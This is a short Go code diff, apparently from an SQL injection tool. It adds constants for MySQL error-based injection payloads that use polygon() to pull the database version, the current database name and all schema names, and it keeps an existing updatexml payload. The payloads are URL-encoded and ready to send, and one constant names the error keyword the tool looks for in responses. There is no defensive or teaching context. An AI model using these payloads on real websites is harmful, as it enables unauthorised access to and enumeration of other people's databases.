@@ -48,3 +48,19 @@ const (
 	UpdatexmlAllDatabasesPayload = "%20and%20updatexml(2,concat(0x7e,(select%20schema_name%20" +
 		"from%20information_schema.schemata%20limit%200,1),0x7e),1)--+"
 )
+
+// 报错注入另一种（不稳定）
+const (
+	// PolygonErrorKeyword 报错回显的关键字
+	PolygonErrorKeyword = "Illegal non geometric"
+	// PolygonVersionPayload 报错注入获得版本
+	PolygonVersionPayload = "%20Or%20polygon((select%20*%20from" +
+		"(select%20*%20from(select%20version())a)b))--+"
+	// PolygonDatabasePayload 报错注入获得当前数据库
+	PolygonDatabasePayload = "%20Or%20polygon((select%20*%20from" +
+		"(select%20*%20from(select%20database())a)b))--+"
+	// PolygonAllDatabasesPayload 报错获得所有数据库
+	PolygonAllDatabasesPayload = "%20Or%20polygon((select%20*%20from" +
+		"(select%20*%20from(select%20group_concat(schema_name)%20from" +
+		"%20information_schema.schemata%20)a)b))--+"
+)
